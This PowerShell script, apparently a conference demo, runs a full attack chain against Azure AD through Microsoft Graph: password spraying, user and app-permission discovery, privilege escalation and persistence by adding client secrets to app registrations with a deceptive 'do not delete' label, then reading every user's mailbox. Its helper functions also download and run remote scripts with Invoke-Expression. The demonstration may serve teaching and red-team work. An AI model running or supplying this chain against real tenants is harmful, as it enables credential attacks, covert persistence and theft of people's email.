#region GLOBAL FUNCTIONS

<#
.SYNOPSIS
    Authenticates a device with Microsoft Azure AD and retrieves a device code.

.DESCRIPTION
    The Get-DeviceAuthentication function initiates device authentication by downloading and executing 
    a script from the CloudKatana GitHub repository. This script, Get-CKDeviceCode.ps1, generates a device code 
    and a verification URL for user authentication against Azure AD.

.PARAMETER ClientId
    Specifies the Client ID to be used for the authentication request. 
    The default value is '1950a258-227b-4e31-a9cf-717495945fc2' which corresponds to Microsoft Azure PowerShell.

.PARAMETER GraphResource
    Specifies the resource URL for Microsoft Graph API.
    The default value is 'https://graph.microsoft.com/'.

.EXAMPLE
    PS C:\> Get-DeviceAuthentication

    This example initiates device authentication using the default Client ID and Microsoft Graph resource URL.

.EXAMPLE
    PS C:\> Get-DeviceAuthentication -ClientId 'your-client-id' -GraphResource 'https://your-resource-url/'

    This example initiates device authentication using a custom Client ID and resource URL.

.OUTPUTS
    The function returns the device code required for completing the device authentication process.

.NOTES
    This function depends on the Get-CKDeviceCode.ps1 script from the CloudKatana GitHub repository. Ensure that the URL is accessible.
#>
function Get-DeviceAuthentication {
    [cmdletbinding()]
    param (
        [string]$ClientId = '1950a258-227b-4e31-a9cf-717495945fc2', # Microsoft Azure PowerShell
        [string]$GraphResource = 'https://graph.microsoft.com/'
    )

    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Azure/Cloud-Katana/main/CloudKatanaAbilities/AzureAD/Authentication/Get-CKDeviceCode.ps1') 

    $DeviceAuthReq = Get-CKDeviceCode -ClientId $ClientId -Resource $GraphResource
    
    Write-Host $DeviceAuthReq.user_code
    Start-Process $DeviceAuthReq.verification_url

    return $DeviceAuthReq.device_code
}

<#
.SYNOPSIS
    Retrieves an access token for a user authenticated with Microsoft Azure AD using a device code.

.DESCRIPTION
    The Get-UserAccessToken function retrieves an access token by executing a script from the CloudKatana GitHub repository.
    This script, Get-CKAccessToken.ps1, generates an access token using the provided device code, client ID, 
    and resource URL for Microsoft Graph API.

.PARAMETER ClientId
    Specifies the Client ID to be used for the token request. 
    The default value is '1950a258-227b-4e31-a9cf-717495945fc2' which corresponds to Microsoft Azure PowerShell.

.PARAMETER GraphResource
    Specifies the resource URL for Microsoft Graph API.
    The default value is 'https://graph.microsoft.com/'.

.PARAMETER DeviceCode
    Specifies the device code obtained from the device authentication process. This code is required 
    to exchange for an access token.

.EXAMPLE
    PS C:\> $DeviceCode = Get-DeviceAuthentication
    PS C:\> Get-UserAccessToken -DeviceCode $DeviceCode

    This example first obtains a device code using the Get-DeviceAuthentication function, 
    and then retrieves an access token using the Get-UserAccessToken function.

.EXAMPLE
    PS C:\> Get-UserAccessToken -ClientId 'your-client-id' -GraphResource 'https://your-resource-url/' -DeviceCode $DeviceCode

    This example retrieves an access token using a custom Client ID, resource URL, and device code.

.OUTPUTS
    The function returns the access token required for accessing Microsoft Graph API or other specified resources.

.NOTES
    This function depends on the Get-CKAccessToken.ps1 script from the CloudKatana GitHub repository. Ensure that the URL is accessible.
#>
function Get-UserAccessToken {
    [cmdletbinding()]
    param (
        [string]$ClientId = '1950a258-227b-4e31-a9cf-717495945fc2', # Microsoft Azure PowerShell
        [string]$GraphResource = 'https://graph.microsoft.com/',
        [string]$DeviceCode
    )

    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Azure/Cloud-Katana/main/CloudKatanaAbilities/AzureAD/Authentication/Get-CKAccessToken.ps1') 

    $AuthResponse = Get-CKAccessToken -Resource $GraphResource -ClientId '1950a258-227b-4e31-a9cf-717495945fc2' -GrantType device_code -DeviceCode $DeviceCode
    return $AuthResponse.access_token
}

<#
.SYNOPSIS
    Sends an HTTP request to the Microsoft Graph API.

.DESCRIPTION
    The Invoke-GraphWebRequest function sends an HTTP request to a specified Microsoft Graph API endpoint.
    It includes an authorization header with the provided access token and supports different HTTP methods 
    such as GET, POST, PUT, and DELETE. The function also handles JSON request bodies.

.PARAMETER AccessToken
    Specifies the access token for authorization. This parameter is mandatory.

.PARAMETER BodyAsJson
    Specifies the body of the request as a JSON object. This parameter is optional and is typically used 
    with HTTP methods that require a body, such as POST or PUT.

.PARAMETER RequestUri
    Specifies the URI of the Microsoft Graph API endpoint to which the request will be sent. This parameter 
    is mandatory.

.PARAMETER HttpMethod
    Specifies the HTTP method to be used for the request. The default value is "GET". Other common values 
    include "POST", "PUT", and "DELETE".

.EXAMPLE
    PS C:\> $AccessToken = "your-access-token"
    PS C:\> $RequestUri = "https://graph.microsoft.com/v1.0/me"
    PS C:\> Invoke-GraphWebRequest -AccessToken $AccessToken -RequestUri $RequestUri

    This example sends a GET request to the Microsoft Graph API to retrieve information about the authenticated user.

.EXAMPLE
    PS C:\> $AccessToken = "your-access-token"
    PS C:\> $RequestUri = "https://graph.microsoft.com/v1.0/users"
    PS C:\> $Body = [PSCustomObject]@{ displayName = "John Doe"; mailNickname = "johndoe"; userPrincipalName = "johndoe@example.com"; accountEnabled = $true; passwordProfile = @{ forceChangePasswordNextSignIn = $true; password = "xWwvJ]6NMw+bWH-d" }}
    PS C:\> Invoke-GraphWebRequest -AccessToken $AccessToken -RequestUri $RequestUri -HttpMethod "POST" -BodyAsJson $Body

    This example sends a POST request to the Microsoft Graph API to create a new user with the specified details.

.OUTPUTS
    The function returns the response from the Microsoft Graph API as a PSCustomObject.

.NOTES
    This function requires a valid access token with appropriate permissions for the requested resource.
    The function uses the Invoke-RestMethod cmdlet to send the HTTP request.
#>
function Invoke-GraphWebRequest {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [string]$AccessToken,
        [PSCustomObject]$BodyAsJson,
        [Parameter(Mandatory)]
        [string]$RequestUri,
        [string]$HttpMethod = "GET"
    )

    $Header = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/json"
    }

    $Params = @{
        Headers = $Header
        uri     = $RequestUri
        Body    = $BodyAsJson
        method  = $HttpMethod
    }
    
    try
    {
        $Request = Invoke-RestMethod @Params -UserAgent "MSGraphSecurityTestKit"
    }
    catch {
        throw $_
    }
    return $Request
}

<#
.SYNOPSIS
    Adds a password credential to an Azure AD application.

.DESCRIPTION
    The Add-CredentialToApp function adds a password credential (client secret) to an Azure AD application.
    It constructs a JSON payload and sends a POST request to the Microsoft Graph API to add the password credential.
    The function returns the generated secret as a secure string.

.PARAMETER AccessToken
    Specifies the access token for authorization. This parameter is mandatory and should have the necessary
    permissions to modify the application's credentials.

.PARAMETER AppObjectId
    Specifies the object ID of the Azure AD application to which the password credential will be added.
    This parameter is mandatory.

.PARAMETER GraphResource
    Specifies the resource URL for Microsoft Graph API. The default value is 'https://graph.microsoft.com/'.

.EXAMPLE
    PS C:\> $AccessToken = "your-access-token"
    PS C:\> $AppObjectId = "your-app-object-id"
    PS C:\> $AppPassword = Add-CredentialToApp -AccessToken $AccessToken -AppObjectId $AppObjectId

    This example adds a password credential to the specified Azure AD application and stores the generated
    secret in the $AppPassword variable as a secure string.

.OUTPUTS
    The function returns the generated password credential as a secure string.

.NOTES
    This function requires a valid access token with appropriate permissions to add credentials to the specified
    Azure AD application. The function uses the Invoke-GraphWebRequest function to send the HTTP request.
#>
function Add-CredentialToApp {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [string]$AccessToken,
        [Parameter(Mandatory)]
        [string]$AppObjectId,
        [string]$GraphResource = 'https://graph.microsoft.com/'
    )

    $WebrequestBody = @{
        "passwordCredential" = @{
            "displayName" = "Important App Password - do not delete!"
        }
    }
    $WebrequestBody = $WebrequestBody | ConvertTo-Json -Compress -Depth 20

    $RequestUri = $GraphResource + "v1.0/applications/$AppObjectId/addPassword"

    $GeneratedSecret = Invoke-GraphWebRequest -AccessToken $AccessToken -BodyAsJson $WebrequestBody -RequestUri $RequestUri -HttpMethod "POST"
    $AppPassword = ConvertTo-SecureString -String $GeneratedSecret.SecretText -AsPlainText -Force
    return $AppPassword
}

#endregion

#region 01 PASSWORD SPRAYING

cd C:\Users\atevet01superadmin\Documents\Miriam_do_not_delete\PSConfDemo\
$PossiblePasswords = ./Invoke-PasswordSpraying.ps1 -Userlist ./Userlist.txt -Passwordlist .\passwords.txt -TimeoutInSeconds 30 -Verbose

$PossiblePasswords
$PossiblePasswords | Where-Object { $_.IsValid -eq "True" } | fl Username, Password, ErrorDescription
$PossiblePasswords | fl Username, Password, IsValid, ErrorDescription

#endregion

#region 02 DISCOVERY

$DeviceCode = Get-DeviceAuthentication
$AccessToken = Get-UserAccessToken -DeviceCode $DeviceCode

$Result = ./Get-MsGraphApplicationPermissions.ps1 -AccessToken $AccessToken

$Result | Where-Object { $_.Value -contains "Mail.Read"}
$Result | Where-Object { $_.Value -contains "Application.ReadWrite.All"}

$Result
#$Result | Export-Csv -Path "$HOME\Documents\ApplicationPermissions.csv"

# Find UPNs of all domain users
$HttpMethod = "GET"
$RequestUri = "https://graph.microsoft.com/v1.0/users/"

$Response = Invoke-GraphWebRequest -AccessToken $AccessToken -RequestUri $RequestUri -HttpMethod $HttpMethod

# Ensure to replace "domain" with the actual domain name you are looking for
$Response.value | Where-Object { $_.mail -and $_.userPrincipalName -like "*domain*"}

$AllUpn = ($Response.value | Where-Object { $_.mail -and $_.userPrincipalName -like "*domain*"}).userPrincipalName

#endregion

#region 03 PRIVILEGE ESCALATION

# Replace the following values with the actual values from the discovery stage
$TenantId = "tenant.onmicrosoft.com"
$AppObjectId_MWVictimSP = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" #MW-Victim-SP

$AppPassword_MWVictimSP = Add-CredentialToApp -AccessToken $AccessToken -AppObjectId $AppObjectId_MWVictimSP

# Get Application Details
$RequestUri = "https://graph.microsoft.com/v1.0/applications/$AppObjectId_MWVictimSP"
$AppObject_MWVictimSP = Invoke-GraphWebRequest -AccessToken $AccessToken -RequestUri $RequestUri -HttpMethod "GET"
$AppId_MWVictimSP = $AppObject_MWVictimSP.appId

# Get the App's access token
$AppAccessToken_MWVictimSP = (Get-MsalToken -ClientSecret $AppPassword_MWVictimSP -ClientId $AppId_MWVictimSP -TenantId $TenantId -Scope 'https://graph.microsoft.com/.default').AccessToken

#endregion

#region 04 PERSISTENCE

# Replace the following value with the actual value from the discovery stage
$AppObjectId_MWMailReadApp = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" #MW-MailReadApp

# Let's add credentials to our app
$AppPassword_MWMailReadApp = Add-CredentialToApp -AccessToken $AppAccessToken_MWVictimSP -AppObjectId $AppObjectId_MWMailReadApp

# Get Application Details
$RequestUri = "https://graph.microsoft.com/v1.0/applications/$AppObjectId_MWMailReadApp"
$AppObject_MWMailReadApp = Invoke-GraphWebRequest -AccessToken $AccessToken -RequestUri $RequestUri -HttpMethod "GET"
$AppId_MWMailReadApp = $AppObject_MWMailReadApp.appId

# Get the App's access token
$AppAccessToken_MWMailReadApp = (Get-MsalToken -ClientSecret $AppPassword_MWMailReadApp -ClientId $AppId_MWMailReadApp -TenantId $TenantId -Scope 'https://graph.microsoft.com/.default' -ForceRefresh).AccessToken

#endregion

#region 05 EXTRACT

#Now we use the collected UPNs from the discovery stage

$AllUpn | ForEach-Object {
    Write-Host $_
    $RequestUri = "https://graph.microsoft.com/v1.0/users/$_/messages"
    $Response = Invoke-GraphWebRequest -AccessToken $AppAccessToken_MWMailReadApp -RequestUri $RequestUri -HttpMethod $HttpMethod 
    Write-Host $Response.value
}

#endregion